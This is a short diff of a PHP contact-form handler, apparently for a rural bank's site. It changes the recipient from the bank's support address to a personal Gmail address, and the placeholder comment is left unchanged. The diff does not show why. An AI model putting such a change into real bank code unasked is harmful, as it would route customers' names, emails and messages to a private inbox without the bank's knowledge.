@@ -4,7 +4,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = htmlspecialchars($_POST['email']);
     $message = htmlspecialchars($_POST['message']);
 
-    $to = "support@ruralbankofmanapla.com"; // Change this to the actual bank email
+    $to = "jonryder1828@gmail.com"; // Change this to the actual bank email
     $subject = "New Contact Form Submission";
     $body = "Name: $name\nEmail: $email\n\nMessage:\n$message";
 
